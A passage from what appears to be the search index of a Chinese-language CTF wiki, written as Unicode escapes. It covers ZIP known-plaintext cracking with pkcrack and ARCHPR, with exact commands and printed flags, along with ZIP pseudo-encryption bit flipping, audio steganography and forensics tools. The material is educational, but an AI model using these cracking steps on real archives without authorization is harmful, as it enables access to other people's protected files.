<p>\u9996\u5148\u6211\u4eec\u62ff\u5230\u8fd9\u6837\u4e00\u9053\u9898\uff0c\u9898\u76ee\u6807\u9898\u4e3a\u7206\u7834?\uff0c\u5f88\u660e\u663e\u8fd9\u9898\u80af\u5b9a\u662f\u8981\u7528\u5230\u4e00\u4e2a\u7834\u89e3\u5de5\u5177\uff0c\u5f88\u66b4\u529b\u7684\u8bf4\u3002</p> <p>\u7b2c\u4e00\u6b65\u3001\u5206\u6790\u538b\u7f29\u5305\u6587\u4ef6</p> <p>\u6211\u4eec\u4e0b\u8f7d\u4e86\u8fd9\u4e2a\u538b\u7f29\u5305\u4ee5\u540e\uff0c\u6211\u4eec\u770b\u5230\u6587\u4ef6\u540d\u662f *.zip \u7ed3\u5c3e\uff0c\u6211\u4eec\u53ef\u4ee5\u7acb\u5373\u60f3\u5230\u7834\u89e3\u538b\u7f29\u5305\u5e38\u7528\u7684\u51e0\u79cd\u65b9\u5f0f\uff0c\u6211\u4eec\u5c06\u5176\u538b\u7f29\u5305\u89e3\u538b\u51fa\u6765\uff0c\u53d1\u73b0\u91cc\u9762\u6709\u4e24\u4e2a\u6587\u4ef6\uff0c\u5206\u522b\u4e3a <code>Desktop.zip</code> \u548c <code>readme.txt</code> \uff0c\u6211\u4eec\u770b\u770b <code>readme.txt</code> \u91cc\u9762\u5199\u4e86\u4ec0\u4e48\uff1f</p> <p></p> <p>\u6253\u5f00\u4ee5\u540e\u7adf\u7136\u662f<code>qianwanbuyaogeixuanshoukandao!!!</code> \uff0c\u51fa\u9898\u4eba\u4e0d\u60f3\u8ba9\u9009\u624b\u770b\u5230\uff0c\u8fd9\u51fa\u9898\u4eba\u8fd8\u662f\u6709\u70b9\u610f\u601d\u3002\u6211\u4eec\u518d\u770b\u770b\u90a3\u4e2a <code>Desktop.zip</code> \uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u91cc\u9762\u6709\u4e2a <code>readme.txt</code> \u6587\u4ef6\u548c <code>answer</code> \u6587\u4ef6\u5939\uff0c <code>answer</code> \u6587\u4ef6\u5939\u4e0b\u6709 <code>key.txt</code> \u6587\u4ef6\uff0c <code>flag</code> \u5e94\u8be5\u5c31\u85cf\u5728\u8fd9\u91cc\u4e86\u3002</p> <p>\u7b2c\u4e8c\u6b65\u3001\u5206\u6790\u7834\u89e3\u65b9\u5f0f</p> <p>\u8fd9\u9898\u76ee\u62ff\u5230\u624b\u4e0a\uff0c\u6211\u4eec\u9996\u5148\u53d1\u73b0\u89e3\u538b\u51fa\u6765\u7684\u6587\u4ef6\u548c <code>Desktop.zip</code> \u538b\u7f29\u5305\u4e2d\u90fd\u542b\u6709\u540c\u6837\u4e00\u4e2a\u6587\u4ef6 <code>readme.txt</code> \uff0c\u800c\u4e14\u5e76\u6ca1\u6709\u7ed9\u51fa\u5176\u4ed6\u76f8\u5173\u4fe1\u606f\uff0c\u4e14\u6587\u4ef6\u5927\u5c0f\u5927\u4e8e <code>12Byte</code> \uff0c\u6211\u4eec\u518d\u5bf9\u6bd4\u538b\u7f29\u5305\u4e2d\u7684 <code>readme.txt</code> \u548c\u539f\u538b\u7f29\u5305\u4e2d\u7684 <code>readme.txt</code> \u7684 <code>CRC32</code> \u7684\u503c\uff0c\u6211\u4eec\u53d1\u73b0\u4e24\u4e2a\u503c\u76f8\u540c\uff0c\u8fd9\u8bf4\u660e\u89e3\u538b\u51fa\u7684 <code>readme.txt</code> \u662f\u52a0\u5bc6\u538b\u7f29\u5305\u91cc\u7684 <code>readme.txt</code> \u7684\u660e\u6587\uff0c\u4e8e\u662f\u6211\u4eec\u53ef\u4ee5\u5927\u80c6\u5730\u731c\u6d4b\u8fd9\u6781\u53ef\u80fd\u662f\u4e2a\u660e\u6587\u52a0\u5bc6\u3002</p> <p></p> <p>\u7b2c\u4e09\u6b65\u3001\u5c1d\u8bd5\u660e\u6587\u653b\u51fb</p> <p>\u65e2\u7136\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u4e86\u5b83\u662f\u660e\u6587\u653b\u51fb\u7684\u8bdd\uff0c\u6211\u4eec\u5c06\u5bf9\u5176\u538b\u7f29\u5305\u8fdb\u884c\u7834\u89e3\uff0c\u7531\u4e8e\u89e3\u538b\u51fa\u7684readme.txt\u662f\u52a0\u5bc6\u538b\u7f29\u5305\u91cc\u7684 <code>readme.txt</code> \u7684\u660e\u6587\uff0c\u5c06 <code>readme.txt</code> \u538b\u7f29\u6210 .zip \u6587\u4ef6\uff0c\u7136\u540e\u5728\u8f6f\u4ef6\u4e2d\u586b\u5165\u76f8\u5e94\u7684\u8def\u5f84\u5373\u53ef\u5f00\u59cb\u8fdb\u884c\u660e\u6587\u653b\u51fb\uff0c\u8fd9\u91cc\u6211\u4eec\u5c06\u4ecb\u7ecd <code>Windows</code> \u548c <code>Ubuntu</code> \u4e0b\u4f7f\u7528\u4e0d\u540c\u7684\u65b9\u5f0f\u8fdb\u884c\u660e\u6587\u653b\u51fb\u3002</p> <p>\u65b9\u6cd5\u4e00\u3001 <code>pkcrack</code> \u8fdb\u884c\u660e\u6587\u653b\u51fb</p> <p><code>pkcrack</code> \u4e0b\u8f7d\u94fe\u63a5\uff1ahttps://www.unix-ag.uni-kl.de/~conrad/krypto/pkcrack.html</p> <p>\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u5199\u4e2a <code>shell</code> \u811a\u672c\u4e0b\u8f7d\u5c31\u597d\u4e86\uff1a</p> <pre><code>#!/bin/bash -ex\n\nwget https://www.unix-ag.uni-kl.de/~conrad/krypto/pkcrack/pkcrack-1.2.2.tar.gz\ntar xzf pkcrack-1.2.2.tar.gz\ncd pkcrack-1.2.2/src\nmake\n\nmkdir -p ../../bin\ncp extract findkey makekey pkcrack zipdecrypt ../../bin\ncd ../../\n</code></pre> <p>\u628a\u6587\u4ef6\u4fdd\u5b58\uff0c\u6539\u4e3a <code>pkcrack-install.sh</code> \uff0c\u7136\u540e\u8dd1\u5230\u5f53\u524d\u76ee\u5f55\u4e0b\uff0c\u7ed9\u5b83\u52a0\u4e00\u4e2a\u6267\u884c\u6743\u9650 <code>x</code> \u3002</p> <pre><code>chmod 777 install.sh\n</code></pre> <p>\u6216\u8005\u76f4\u63a5\u53ef\u4ee5\uff1a</p> <pre><code>chmod u+x install.sh\n</code></pre> <p>\u7136\u540e\u8fd0\u884c <code>./pkcrack-install.sh</code> </p> <p></p> <p>\u7136\u540e\u5f53\u524d\u76ee\u5f55\u4e0b\u4f1a\u751f\u6210\u4e00\u4e2a <code>bin</code> \u7684\u6587\u4ef6\u5939\uff0c\u6211\u4eec\u76f4\u63a5\u8fdb\u5165 <code>bin</code> \u6587\u4ef6\u5939\u4e0b\uff0c\u770b\u5230\u6709 <code>pkcrack</code> \u6587\u4ef6\uff0c\u76f4\u63a5\u5bf9\u6587\u4ef6\u8fdb\u884c\u660e\u6587\u7834\u89e3\u3002</p> <pre><code>./pkcrack -c \"readme.txt\" -p readme.txt  -C ~/\u4e0b\u8f7d/misc/Desktop.zip -P ~/\u4e0b\u8f7d/misc/readme.zip -d ~/decrypt.zip\n</code></pre> <p>\u6211\u4eec\u6240\u7528\u5230\u7684\u53c2\u6570\u9009\u9879\u5982\u4e0b\uff1a</p> <pre><code>-C:\u8981\u7834\u89e3\u7684\u76ee\u6807\u6587\u4ef6(\u542b\u8def\u5f84)\n\n-c:\u7834\u89e3\u6587\u4ef6\u4e2d\u7684\u660e\u6587\u6587\u4ef6\u7684\u540d\u5b57(\u5176\u8def\u5f84\u4e0d\u5305\u62ec\u7cfb\u7edf\u8def\u5f84,\u4ecezip\u6587\u4ef6\u4e00\u5c42\u5f00\u59cb)\n\n-P:\u538b\u7f29\u540e\u7684\u660e\u6587\u6587\u4ef6\n\n-p:\u538b\u7f29\u7684\u660e\u6587\u6587\u4ef6\u4e2d\u660e\u6587\u6587\u4ef6\u7684\u540d\u5b57(\u4e5f\u5c31\u662freadme.txt\u5728readme.zip\u4e2d\u7684\u4f4d\u7f6e)\n-d:\u6307\u5b9a\u6587\u4ef6\u540d\u53ca\u6240\u5728\u7684\u7edd\u5bf9\u8def\u5f84\uff0c\u5c06\u89e3\u5bc6\u540e\u7684zip\u6587\u4ef6\u8f93\u51fa\n</code></pre> <p>\u81f3\u4e8e\u5176\u4ed6\u9009\u9879\u53c2\u770b <code>./pkcrack --help</code> </p> <p>\u89e3\u5bc6\u540e\u7684\u7ed3\u679c\u5982\u4e0b\uff1a</p> <p></p> <p></p> <p></p> <p></p> <p>\u6211\u4eec\u53ef\u4ee5\u770b\u5230\uff0c\u6211\u4eec\u4e0b\u5348 <code>1:10</code> \u5f00\u59cb\u8dd1\u7684\uff0c\u4e0b\u5348 <code>3:27</code> \u624d\u6c42\u89e3\u51fa\u79d8\u94a5\u3002</p> <p>\u6211\u4eec\u5f97\u51fa\u4e86\u6700\u7ec8\u7684flag\u4e3a\uff1a<code>flag{7ip_Fi13_S0m3tim3s_s0_3a5y@}</code></p> <p>\u5751\u70b9\u6765\u4e86</p> <p>\u770b\u8d77\u6765\u4e00\u5207\u90fd\u5f88\u987a\u5229\u7684\u6837\u5b50\uff0c\u540c\u6837\u82b1\u4e86\u4e24\u4e2a\u591a\u5c0f\u65f6\uff0c\u4e3a\u5565\u6211\u5728\u535a\u5ba2\u56ed\u4e0a\u5199\u4e86\u6211\u8dd1\u4e86\u4e24\u4e2a\u5c0f\u65f6\u90fd\u6ca1\u8dd1\u51fa\u6765\u5462\uff1f\u6216\u8005\u8bf4\u6709\u670b\u53cb\u9047\u5230\u4e86\u548c\u6211\u4e00\u6837\u7684\u95ee\u9898\uff0c\u6211\u660e\u660e\u548c\u4f60\u662f\u4e00\u6837\u7684\uff0c\u4e3a\u5565\u6211\u8dd1\u4e0d\u51fa\u7ed3\u679c\uff1f</p> <p>\u4f60\u4eec\u53ef\u80fd\u5ffd\u7565\u4e86\u4e00\u4e9b\u7ec6\u8282\u95ee\u9898\uff0c\u6709\u4eba\u66fe\u60f3\u8fc7\u539f\u538b\u7f29\u5305\u662f\u901a\u8fc7\u4ec0\u4e48\u65b9\u5f0f\u538b\u7f29\u7684\u561b\uff1f\u8fd8\u6709\u5c31\u662f\u6211\u4eec\u751f\u6210\u7684 <code>readme.zip</code> \u53c8\u8be5\u4ee5\u54ea\u79cd\u65b9\u5f0f\u53bb\u751f\u6210\u5462\uff1f\u6211\u5c31\u662f\u56e0\u4e3a\u8fd9\u4e2a\u95ee\u9898\u5361\u4e86\u6574\u6574\u4e09\u4e2a\u6708\u6ca1\u505a\u51fa\u6765\uff0c\u4e0d\u4fe1\u7684\u8bdd\u6211\u4eec\u53ef\u4ee5\u770b\u770b\u7b2c\u4e8c\u79cd\u65b9\u6cd5\uff0c\u5728 <code>Windows</code> \u4e0b\u7528 <code>ARCHPR</code> \u8fdb\u884c\u660e\u6587\u653b\u51fb\u3002</p> <p>\u65b9\u6cd5\u4e8c\u3001 <code>ARCHPR</code> \u8fdb\u884c\u660e\u6587\u653b\u51fb</p> <p>\u9996\u5148\u8fd9\u9898\u6211\u5efa\u8bae\u5927\u5bb6\u4e0b <code>ARCHPR 4.53</code> \u7248\u672c\uff0c\u6211\u662f\u5728\u8fd9\u4e2a\u7248\u672c\u4e0b\u6d4b\u8bd5\u6210\u529f\u7684\u3002\u6210\u529f\u622a\u56fe\u5982\u4e0b\uff1a</p> <p></p> <p>\u6211\u76f8\u4fe1\u5f88\u591a\u670b\u53cb\u5728\u7528 <code>ARCHPR</code> \u7684\u65f6\u5019\u9047\u5230\u4ee5\u4e0b\u8fd9\u79cd\u60c5\u51b5\uff1a</p> <p></p> <p>\u6211\u5f53\u65f6\u5185\u5fc3\u662f\u5d29\u6e83\u7684\uff0c\u4e3a\u5565\u4f1a\u51fa\u73b0\u8fd9\u79cd\u60c5\u51b5\u3002</p> <p>\u5728\u540e\u6765\u7684\u5b66\u4e60\u4e2d\u53d1\u73b0\uff0c\u7528 <code>7z</code> \u538b\u7f29\u7684\u6587\u4ef6\u5f97\u7528 <code>7z</code> \u6765\u89e3\u538b\u7f29\uff0c <code>7z</code> \u662f\u4e00\u79cd\u4f7f\u7528\u591a\u79cd\u538b\u7f29\u7b97\u6cd5\u8fdb\u884c\u6570\u636e\u538b\u7f29\u7684\u6863\u6848\u683c\u5f0f\uff0c\u548c\u4f20\u7edf\u7684 <code>zip</code> \uff0c <code>rar</code> \u76f8\u6bd4\uff0c\u5b83\u7684\u538b\u7f29\u6bd4\u7387\u66f4\u5927\uff0c\u91c7\u7528\u7684\u538b\u7f29\u7b97\u6cd5\u4e0d\u540c\uff0c\u81ea\u7136\u800c\u7136\u5c31\u53ef\u80fd\u51fa\u73b0\u4e0d\u5339\u914d\u8fd9\u79cd\u60c5\u51b5\uff0c\u6240\u4ee5\u6211\u4eec\u5728\u89e3\u538b\u7f29\u539f\u538b\u7f29\u5305\u548c\u5bf9\u6587\u4ef6\u8fdb\u884c\u52a0\u5bc6\u7684\u65f6\u5019\u5f97\u5148\u5206\u6790\u51fa\u9898\u4eba\u662f\u7528\u4ec0\u4e48\u65b9\u5f0f\u8fdb\u884c\u52a0\u89e3\u5bc6\u7684\uff0c\u6240\u4ee5\u8fd9\u9898\u7684\u95ee\u9898\u663e\u800c\u6613\u89c1\u5c31\u51fa\u6765\u4e86\uff0c\u7ecf\u8fc7\u9a8c\u8bc1\uff0c\u6211\u53d1\u73b0\u51fa\u9898\u4eba\u662f\u7528 <code>7z</code> \u8fdb\u884c\u538b\u7f29\u7684\u3002</p> <p>\u518d\u5c1d\u8bd5</p> <p>\u6211\u4eec\u5df2\u7ecf\u53d1\u73b0\u4e86\u8fd9\u4e2a\u95ee\u9898\uff0c\u6211\u4eec\u53bb\u5b98\u7f51\u4e0b\u8f7d <code>7zip</code> \uff1ahttps://www.7-zip.org/</p> <p>\u7136\u540e\u6211\u4eec\u5bf9\u539f\u538b\u7f29\u6587\u4ef6\u7528 <code>7z</code> \u8fdb\u884c\u89e3\u538b\u7f29\uff0c\u7136\u540e\u5c06 <code>readme.txt</code> \u75287z\u8fdb\u884c\u538b\u7f29\u5373\u53ef\u3002\u7136\u540e\u6211\u4eec\u5c31\u53ef\u4ee5\u7528 <code>ARCHPR</code> \u8fdb\u884c\u660e\u6587\u653b\u51fb\u4e86\u3002</p> <p>\u7ed3\u679c\u5982\u4e0b\uff1a</p> <p></p> <p>\u6211\u4eec\u5c06 <code>Desktop_decrypted.zip</code> \u89e3\u538b\u51fa\u6765\uff0c\u67e5\u770b <code>answer</code> \u76ee\u5f55\u4e0b\u7684 <code>key.txt</code> \u5373\u53ef\u3002</p> <p>\u6240\u4ee5\u6700\u7ec8\u7684flag\u4e3a\uff1a<code>flag{7ip_Fi13_S0m3tim3s_s0_3a5y@}</code></p>"},{"location":"misc/archive/zip/#_10","title":"\u4f2a\u52a0\u5bc6","text":""},{"location":"misc/archive/zip/#_11","title":"\u539f\u7406","text":"<p>\u5728\u4e0a\u6587 <code>ZIP</code> \u683c\u5f0f\u4e2d\u7684 \u6838\u5fc3\u76ee\u5f55\u533a \u4e2d\uff0c\u6211\u4eec\u5f3a\u8c03\u4e86\u4e00\u4e2a\u53eb\u505a\u901a\u7528\u4f4d\u6807\u8bb0 <code>(General purpose bit flag)</code> \u7684 <code>2</code> \u5b57\u8282\uff0c\u4e0d\u540c\u6bd4\u7279\u4f4d\u6709\u7740\u4e0d\u540c\u7684\u542b\u4e49\u3002</p> <pre><code>Bit 0: If set, indicates that the file is encrypted.\n\n(For Method 6 - Imploding)\nBit 1: If the compression method used was type 6,\n     Imploding, then this bit, if set, indicates\n     an 8K sliding dictionary was used.  If clear,\n     then a 4K sliding dictionary was used.\n...\nBit 6: Strong encryption.  If this bit is set, you should\n     set the version needed to extract value to at least\n     50 and you must also set bit 0.  If AES encryption\n     is used, the version needed to extract value must\n     be at least 51.\n...\n</code></pre> <p>\u5728 <code>010Editor</code> \u4e2d\u6211\u4eec\u5c1d\u8bd5\u7740\u5c06\u8fd9 <code>1</code> \u4f4d\u4fee\u6539 <code>0 --&gt; 1</code>\u3002</p> <p></p> <p>\u518d\u6253\u5f00\u6587\u4ef6\u53d1\u73b0\u5df2\u8981\u6c42\u8f93\u5165\u5bc6\u7801\u3002</p> <p></p> <p>\u4fee\u6539\u4f2a\u52a0\u5bc6\u7684\u65b9\u6cd5\uff1a</p> <ul> <li><code>16</code> \u8fdb\u5236\u4e0b\u4fee\u6539\u901a\u7528\u4f4d\u6807\u8bb0</li> <li><code>binwalk -e</code> \u65e0\u89c6\u4f2a\u52a0\u5bc6</li> <li>\u5728 <code>Mac OS</code> \u53ca\u90e8\u5206 <code>Linux</code>(\u5982 <code>Kali</code> )\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u76f4\u63a5\u6253\u5f00\u4f2a\u52a0\u5bc6\u7684 <code>ZIP</code> \u538b\u7f29\u5305</li> <li>\u68c0\u6d4b\u4f2a\u52a0\u5bc6\u7684\u5c0f\u5de5\u5177 <code>ZipCenOp.jar</code></li> <li>\u6709\u65f6\u5019\u7528 <code>WinRar</code> \u7684\u4fee\u590d\u529f\u80fd\uff08\u6b64\u65b9\u6cd5\u6709\u65f6\u6709\u5947\u6548\uff0c\u4e0d\u4ec5\u9488\u5bf9\u4f2a\u52a0\u5bc6\uff09</li> </ul>"},{"location":"misc/archive/zip/#_12","title":"\u4f8b\u9898","text":"<p><code>SSCTF-2017</code> \uff1a\u6211\u4eec\u7684\u79d8\u5bc6\u662f\u7eff\u8272\u7684</p> <p><code>WP</code>\uff1ahttp://bobao.360.cn/ctf/detail/197.html</p> <p>\u6211\u4eec\u5728\u5f97\u5230\u4e24\u4e2a <code>readme.txt</code>\uff0c\u4e14\u4e00\u4e2a\u52a0\u5bc6\uff0c\u4e00\u4e2a\u5df2\u77e5\uff0c\u5f88\u5bb9\u6613\u60f3\u5230\u660e\u6587\u653b\u51fb\u7684\u624b\u6cd5\u3002</p> <p>\u6ce8\u610f\u5728\u7528\u660e\u6587\u653b\u51fb\u65f6\u7684\u64cd\u4f5c\u3002</p> <p></p> <p>\u5f97\u5230\u5bc6\u7801 <code>Y29mZmVl</code> \u540e\uff0c\u89e3\u538b\u7f29\u6587\u4ef6\uff0c\u5f97\u5230\u53e6\u4e00\u4e2a\u538b\u7f29\u5305\u3002</p> <p>\u89c2\u5bdf\u901a\u7528\u4f4d\u6807\u8bb0\u4f4d\uff0c\u731c\u6d4b\u4f2a\u52a0\u5bc6\uff0c\u4fee\u6539\u540e\u89e3\u538b\u5f97\u5230 flag\u3002</p> <p>\u8fd9\u4e00\u9898\uff0c\u57fa\u672c\u6db5\u76d6\u4e86\u6bd4\u8d5b\u4e2d ZIP \u7684\u5e38\u89c1\u8003\u5bdf\u624b\u6cd5\uff0c\u7206\u7834\uff0c\u4f2a\u52a0\u5bc6\uff0c\u660e\u6587\u653b\u51fb\u7b49\uff0c\u90fd\u5728\u672c\u9898\u4e2d\u51fa\u73b0\u3002</p>"},{"location":"misc/archive/zip/#_13","title":"\u53c2\u8003\u6587\u732e","text":"<ul> <li>https://pkware.cachefly.net/webdocs/APPNOTE/APPNOTE-6.2.0.txt</li> <li>https://www.cnblogs.com/ECJTUACM-873284962/p/9387711.html</li> <li>https://www.cnblogs.com/ECJTUACM-873284962/p/9884416.html</li> <li>http://bobao.360.cn/ctf/detail/197.html</li> </ul>"},{"location":"misc/audio/introduction/","title":"\u97f3\u9891\u9690\u5199","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u4e0e\u97f3\u9891\u76f8\u5173\u7684 CTF \u9898\u76ee\u4e3b\u8981\u4f7f\u7528\u4e86\u9690\u5199\u7684\u7b56\u7565\uff0c\u4e3b\u8981\u5206\u4e3a MP3 \u9690\u5199\uff0cLSB \u9690\u5199\uff0c\u6ce2\u5f62\u9690\u5199\uff0c\u9891\u8c31\u9690\u5199\u7b49\u7b49\u3002</p>"},{"location":"misc/audio/introduction/#_2","title":"\u5e38\u89c1\u624b\u6bb5","text":"<p>\u901a\u8fc7 <code>binwalk</code> \u4ee5\u53ca <code>strings</code> \u53ef\u4ee5\u53d1\u73b0\u7684\u4fe1\u606f\u4e0d\u518d\u8be6\u8ff0\u3002</p>"},{"location":"misc/audio/introduction/#mp3","title":"MP3 \u9690\u5199","text":""},{"location":"misc/audio/introduction/#_3","title":"\u539f\u7406","text":"<p>MP3\u9690\u5199\u4e3b\u8981\u662f\u4f7f\u7528 Mp3Stego \u5de5\u5177\u8fdb\u884c\u9690\u5199\uff0c\u5176\u57fa\u672c\u4ecb\u7ecd\u53ca\u4f7f\u7528\u65b9\u6cd5\u5982\u4e0b</p> <p>MP3Stego will hide information in MP3 files during the compression process. The data is first compressed, encrypted and then hidden in the MP3 bit stream.</p> <pre><code>encode -E hidden_text.txt -P pass svega.wav svega_stego.mp3\ndecode -X -P pass svega_stego.mp3\n</code></pre>"},{"location":"misc/audio/introduction/#_4","title":"\u4f8b\u9898","text":"<p>ISCC-2016: Music Never Sleep</p> <p>\u521d\u6b65\u89c2\u5bdf\u540e\uff0c\u7531 <code>strings</code> \u65e0\u53d1\u73b0\uff0c\u542c\u97f3\u9891\u65e0\u5f02\u5e38\u731c\u6d4b\u4f7f\u7528\u9690\u5199\u8f6f\u4ef6\u9690\u85cf\u6570\u636e\u3002</p> <p></p> <p>\u5f97\u5230\u5bc6\u7801\u540e\u4f7f\u7528 <code>Mp3Stego</code> \u89e3\u5bc6\u3002</p> <pre><code>decode.exe -X ISCC2016.mp3 -P bfsiscc2016\n</code></pre> <p>\u5f97\u5230\u6587\u4ef6 <code>iscc2016.mp3.txt</code>: <pre><code>Flag is SkYzWEk0M1JOWlNHWTJTRktKUkdJTVpXRzVSV0U2REdHTVpHT1pZPQ== ???\n</code></pre></p> <p>Base64 &amp;&amp; Base32 \u540e\u5f97\u5230 flag\u3002</p>"},{"location":"misc/audio/introduction/#_5","title":"\u6ce2\u5f62","text":""},{"location":"misc/audio/introduction/#_6","title":"\u539f\u7406","text":"<p>\u901a\u5e38\u6765\u8bf4\uff0c\u6ce2\u5f62\u65b9\u5411\u7684\u9898\uff0c\u5728\u89c2\u5bdf\u5230\u5f02\u5e38\u540e\uff0c\u4f7f\u7528\u76f8\u5173\u8f6f\u4ef6\uff08Audacity, Adobe Audition \u7b49\uff09\u89c2\u5bdf\u6ce2\u5f62\u89c4\u5f8b\uff0c\u5c06\u6ce2\u5f62\u8fdb\u4e00\u6b65\u8f6c\u5316\u4e3a 01 \u5b57\u7b26\u4e32\u7b49\uff0c\u4ece\u800c\u63d0\u53d6\u8f6c\u5316\u51fa\u6700\u7ec8\u7684 flag\u3002</p>"},{"location":"misc/audio/introduction/#_7","title":"\u4f8b\u9898","text":"<p>ISCC-2017: Misc-04</p> <p>\u5176\u5b9e\u8fd9\u9898\u9690\u85cf\u7684\u4fe1\u606f\u5728\u6700\u5f00\u59cb\u7684\u4e00\u6bb5\u97f3\u9891\u5185\uff0c\u4e0d\u7ec6\u5fc3\u542c\u53ef\u80fd\u4f1a\u8bef\u8ba4\u4e3a\u662f\u9690\u5199\u8f6f\u4ef6\u3002</p> <p></p> <p>\u4ee5\u9ad8\u4e3a 1 \u4f4e\u4e3a 0\uff0c\u8f6c\u6362\u5f97\u5230 <code>01</code> \u5b57\u7b26\u4e32\u3002</p> <pre><code>110011011011001100001110011111110111010111011000010101110101010110011011101011101110110111011110011111101\n</code></pre> <p>\u8f6c\u4e3a ASCII\uff0c\u6469\u65af\u5bc6\u7801\u89e3\u5bc6\uff0c\u5f97\u5230 flag\u3002</p> <p>Note</p> <p>\u4e00\u4e9b\u8f83\u590d\u6742\u7684\u53ef\u80fd\u4f1a\u5148\u5bf9\u97f3\u9891\u8fdb\u884c\u4e00\u7cfb\u5217\u7684\u5904\u7406\uff0c\u5982\u6ee4\u6ce2\u7b49\u3002\u4f8b\u5982 JarvisOJ - \u4e0a\u5e1d\u4e4b\u97f3 Writeup</p>"},{"location":"misc/audio/introduction/#_8","title":"\u9891\u8c31","text":""},{"location":"misc/audio/introduction/#_9","title":"\u539f\u7406","text":"<p>\u97f3\u9891\u4e2d\u7684\u9891\u8c31\u9690\u5199\u662f\u5c06\u5b57\u7b26\u4e32\u9690\u85cf\u5728\u9891\u8c31\u4e2d\uff0c\u6b64\u7c7b\u97f3\u9891\u901a\u5e38\u4f1a\u6709\u4e00\u4e2a\u8f83\u660e\u663e\u7684\u7279\u5f81\uff0c\u542c\u8d77\u6765\u662f\u4e00\u6bb5\u6742\u97f3\u6216\u8005\u6bd4\u8f83\u523a\u8033\u3002</p>"},{"location":"misc/audio/introduction/#_10","title":"\u4f8b\u9898","text":"<p>Su-ctf-quals-2014:hear_with_your_eyes</p> <p></p>"},{"location":"misc/audio/introduction/#lsb","title":"LSB\u97f3\u9891\u9690\u5199","text":""},{"location":"misc/audio/introduction/#_11","title":"\u539f\u7406","text":"<p>\u7c7b\u4f3c\u4e8e\u56fe\u7247\u9690\u5199\u4e2d\u7684 LSB \u9690\u5199\uff0c\u97f3\u9891\u4e2d\u4e5f\u6709\u5bf9\u5e94\u7684 LSB \u9690\u5199\u3002\u4e3b\u8981\u53ef\u4ee5\u4f7f\u7528 Silenteye \u5de5\u5177\uff0c\u5176\u4ecb\u7ecd\u5982\u4e0b\uff1a</p> <p>SilentEye is a cross-platform application design for an easy use of steganography, in this case hiding messages into pictures or sounds. It provides a pretty nice interface and an easy integration of new steganography algorithm and cryptography process by using a plug-ins system.</p>"},{"location":"misc/audio/introduction/#_12","title":"\u4f8b\u9898","text":"<p>2015 \u5e7f\u4e1c\u7701\u5f3a\u7f51\u676f - Little Apple</p> <p>\u76f4\u63a5\u4f7f\u7528 <code>silenteye</code> \u5373\u53ef\u3002</p> <p></p>"},{"location":"misc/audio/introduction/#_13","title":"\u5ef6\u4f38","text":"<ul> <li>\u97f3\u9891\u4e2d\u7684 LSB</li> <li>\u9690\u5199\u672f\u603b\u7ed3</li> </ul>"},{"location":"misc/disk-memory/introduction/","title":"\u78c1\u76d8\u5185\u5b58\u5206\u6790","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"misc/disk-memory/introduction/#_2","title":"\u5e38\u7528\u5de5\u5177","text":"<ul> <li>EasyRecovery</li> <li>MedAnalyze</li> <li>FTK</li> <li>Elcomsoft Forensic Disk Decryptor</li> <li>Volatility</li> </ul>"},{"location":"misc/disk-memory/introduction/#_3","title":"\u78c1\u76d8","text":"<p>\u5e38\u89c1\u7684\u78c1\u76d8\u5206\u533a\u683c\u5f0f\u6709\u4ee5\u4e0b\u51e0\u79cd</p> <ul> <li>Windows: FAT12 -&gt; FAT16 -&gt; FAT32 -&gt; NTFS</li> <li>Linux: EXT2 -&gt; EXT3 -&gt; EXT4</li> <li> <p>FAT \u4e3b\u78c1\u76d8\u7ed3\u6784</p> <p></p> </li> <li> <p>\u5220\u9664\u6587\u4ef6\uff1a\u76ee\u5f55\u8868\u4e2d\u6587\u4ef6\u540d\u7b2c\u4e00\u5b57\u8282 <code>e5</code>\u3002</p> </li> </ul>"},{"location":"misc/disk-memory/introduction/#vmdk","title":"VMDK","text":"<p>VMDK \u6587\u4ef6\u672c\u8d28\u4e0a\u662f\u7269\u7406\u786c\u76d8\u7684\u865a\u62df\u7248\uff0c\u4e5f\u4f1a\u5b58\u5728\u8ddf\u7269\u7406\u786c\u76d8\u7684\u5206\u533a\u548c\u6247\u533a\u4e2d\u7c7b\u4f3c\u7684\u586b\u5145\u533a\u57df\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u8fd9\u4e9b\u586b\u5145\u533a\u57df\u6765\u628a\u6211\u4eec\u9700\u8981\u9690\u85cf\u7684\u6570\u636e\u9690\u85cf\u5230\u91cc\u9762\u53bb\uff0c\u8fd9\u6837\u53ef\u4ee5\u907f\u514d\u9690\u85cf\u7684\u6587\u4ef6\u589e\u52a0\u4e86 VMDK \u6587\u4ef6\u7684\u5927\u5c0f\uff08\u5982\u76f4\u63a5\u9644\u52a0\u5230\u6587\u4ef6\u540e\u7aef\uff09\uff0c\u4e5f\u53ef\u4ee5\u907f\u514d\u7531\u4e8e VMDK \u6587\u4ef6\u5927\u5c0f\u7684\u6539\u53d8\u6240\u5e26\u6765\u7684\u53ef\u80fd\u5bfc\u81f4\u7684\u865a\u62df\u673a\u9519\u8bef\u3002\u800c\u4e14 VMDK \u6587\u4ef6\u4e00\u822c\u6bd4\u8f83\u5927\uff0c\u9002\u5408\u7528\u4e8e\u9690\u85cf\u5927\u6587\u4ef6\u3002</p>"},{"location":"misc/disk-memory/introduction/#_4","title":"\u5185\u5b58","text":"<ul> <li>\u89e3\u6790 Windows / Linux / Mac OS X \u5185\u5b58\u7ed3\u6784</li> <li>\u5206\u6790\u8fdb\u7a0b\uff0c\u5185\u5b58\u6570\u636e</li> <li>\u6839\u636e\u9898\u76ee\u63d0\u793a\u5bfb\u627e\u7ebf\u7d22\u548c\u601d\u8def\uff0c\u63d0\u53d6\u5206\u6790\u6307\u5b9a\u8fdb\u7a0b\u7684\u7279\u5b9a\u5185\u5b58\u6570\u636e</li> </ul>"},{"location":"misc/disk-memory/introduction/#_5","title":"\u9898\u76ee","text":"<ul> <li>Jarvis OJ - MISC - \u53d6\u8bc1 2</li> </ul>"},{"location":"misc/disk-memory/introduction/#_6","title":"\u53c2\u8003","text":"<ul> <li>\u6570\u636e\u9690\u85cf\u6280\u672f</li> </ul>"},{"location":"misc/disk-memory/problem/","title":"\u9898\u76ee","text":"<p>Warning</p> <p>The current page still 